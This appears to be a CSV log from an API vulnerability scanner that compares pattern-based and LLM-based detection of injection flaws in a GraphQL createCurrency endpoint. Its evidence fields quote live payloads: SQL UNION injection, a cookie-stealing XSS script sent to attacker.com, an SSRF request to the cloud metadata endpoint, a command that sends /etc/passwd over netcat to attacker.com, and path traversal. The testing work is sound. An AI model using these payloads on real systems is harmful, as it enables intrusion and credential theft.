timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-08T14:59:50.348259,createCurrency_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a SQL injection payload (UNION SELECT) embedded in the 'country' field. The presence of a single quote followed by UNION SELECT and a comment (--) strongly indicates an attempted SQL injection attack. While the 200 status code shows the request was accepted, the stored SQL syntax in a parameter suggests inadequate input sanitization, which could allow database manipulation. The payload matches common SQLi patterns to exfiltrate data from other tables (currencies)."", ""evidence"": ""country: \""Thailand' UNION SELECT * FROM currencies -- \"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.9, ""evidence"": ""country: \""Thailand' UNION SELECT * FROM currencies -- \"""", ""explanation"": ""The response contains a SQL injection payload (UNION SELECT) embedded in the 'country' field. The presence of a single quote followed by UNION SELECT and a comment (--) strongly indicates an attempted SQL injection attack. While the 200 status code shows the request was accepted, the stored SQL syntax in a parameter suggests inadequate input sanitization, which could allow database manipulation. The payload matches common SQLi patterns to exfiltrate data from other tables (currencies).""}}]"
2025-10-08T14:59:56.621891,createCurrency_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a stored XSS payload in the 'country' field (<script>document.location='http://attacker.com/'+document.cookie</script>). This demonstrates unescaped HTML/script output in a GraphQL response field, which would execute arbitrary JavaScript in a victim's browser if rendered directly in a web interface. The payload attempts to exfiltrate user cookies to an attacker-controlled domain."", ""evidence"": ""\""country\"": \""<script>document.location='http://attacker.com/'+document.cookie</script>\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""\""country\"": \""<script>document.location='http://attacker.com/'+document.cookie</script>\"""", ""explanation"": ""The response contains a stored XSS payload in the 'country' field (<script>document.location='http://attacker.com/'+document.cookie</script>). This demonstrates unescaped HTML/script output in a GraphQL response field, which would execute arbitrary JavaScript in a victim's browser if rendered directly in a web interface. The payload attempts to exfiltrate user cookies to an attacker-controlled domain.""}}]"
2025-10-08T15:00:15.871098,createCurrency_response_4,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]","[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a URL pointing to 169.254.169.254 - a well-known metadata endpoint for cloud services (AWS, GCP, Azure). This strongly suggests the application is processing internal network requests via user-controlled input. Accessing cloud instance metadata can expose sensitive credentials and configuration data, making this a critical SSRF vulnerability. The URL structure matches exactly with AWS EC2 metadata service patterns, a common SSRF target."", ""evidence"": ""country: http://169.254.169.254/latest/meta-data/"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""country: http://169.254.169.254/latest/meta-data/"", ""explanation"": ""The response contains a URL pointing to 169.254.169.254 - a well-known metadata endpoint for cloud services (AWS, GCP, Azure). This strongly suggests the application is processing internal network requests via user-controlled input. Accessing cloud instance metadata can expose sensitive credentials and configuration data, making this a critical SSRF vulnerability. The URL structure matches exactly with AWS EC2 metadata service patterns, a common SSRF target.""}}]"
2025-10-08T15:00:23.828421,createCurrency_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a crafted payload in the 'country' field using shell command separators (;) and pipe operators (|), attempting to execute 'cat /etc/passwd' and exfiltrate data via netcat to attacker.com. This pattern indicates an attempt to execute arbitrary OS commands through improper input sanitization in a GraphQL mutation."", ""evidence"": ""country: \""; cat /etc/passwd | nc attacker.com 4444 ;\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""country: \""; cat /etc/passwd | nc attacker.com 4444 ;\"""", ""explanation"": ""The response contains a crafted payload in the 'country' field using shell command separators (;) and pipe operators (|), attempting to execute 'cat /etc/passwd' and exfiltrate data via netcat to attacker.com. This pattern indicates an attempt to execute arbitrary OS commands through improper input sanitization in a GraphQL mutation.""}}]"
2025-10-08T15:00:32.727087,createCurrency_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: path_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a directory traversal payload (../../../../etc/passwd) in the 'country' field, indicating potential path manipulation. While there's no direct evidence of file access in the response, the payload reflects insufficient input validation and suggests the application might process user-controlled paths unsafely. This could allow attackers to access sensitive files if the backend uses this value in filesystem operations."", ""evidence"": ""country: \""../../../../etc/passwd\"""", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""HIGH"", ""confidence"": 0.85, ""evidence"": ""country: \""../../../../etc/passwd\"""", ""explanation"": ""The response contains a directory traversal payload (../../../../etc/passwd) in the 'country' field, indicating potential path manipulation. While there's no direct evidence of file access in the response, the payload reflects insufficient input validation and suggests the application might process user-controlled paths unsafely. This could allow attackers to access sensitive files if the backend uses this value in filesystem operations.""}}]"
2025-10-08T15:00:46.184097,createCurrency_response_7,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains unsanitized user-controlled HTML markup (`<iframe>` tag) in the 'country' field. This indicates the server accepts and returns raw HTML input without proper escaping/sanitization. When rendered in a browser, this payload would execute JavaScript (XSS), demonstrating both HTML injection and XSS capabilities. While HTML injection is confirmed, actual exploitation depends on client-side rendering practices."", ""evidence"": ""\""country\"": \""<iframe src='javascript:alert(1)'>\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""\""country\"": \""<iframe src='javascript:alert(1)'>\"""", ""explanation"": ""The response contains unsanitized user-controlled HTML markup (`<iframe>` tag) in the 'country' field. This indicates the server accepts and returns raw HTML input without proper escaping/sanitization. When rendered in a browser, this payload would execute JavaScript (XSS), demonstrating both HTML injection and XSS capabilities. While HTML injection is confirmed, actual exploitation depends on client-side rendering practices.""}}]"
2025-10-08T15:01:04.779913,createCurrency_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T16:23:36.257120,createCurrency_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T16:27:02.036214,createCurrency_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T16:27:14.584121,createCurrency_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Injection Attacks,1,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: Information Disclosure"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response exposes schema field names via error message suggestions when invalid fields are queried. This constitutes a field_suggestions vulnerability, as it leaks valid schema fields (e.g., 'rate', 'country', 'symbol') through typo corrections. While not critical, this information disclosure could help attackers map the API schema and identify potential attack surfaces."", ""evidence"": ""Field suggestions in error messages: \""Did you mean 'rate'?\"", \""Did you mean 'country'?\"", \""Did you mean 'symbol'?\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Information Disclosure"", ""severity"": ""MEDIUM"", ""confidence"": 0.9, ""evidence"": ""Field suggestions in error messages: \""Did you mean 'rate'?\"", \""Did you mean 'country'?\"", \""Did you mean 'symbol'?\"""", ""explanation"": ""The GraphQL response exposes schema field names via error message suggestions when invalid fields are queried. This constitutes a field_suggestions vulnerability, as it leaks valid schema fields (e.g., 'rate', 'country', 'symbol') through typo corrections. While not critical, this information disclosure could help attackers map the API schema and identify potential attack surfaces.""}}]"
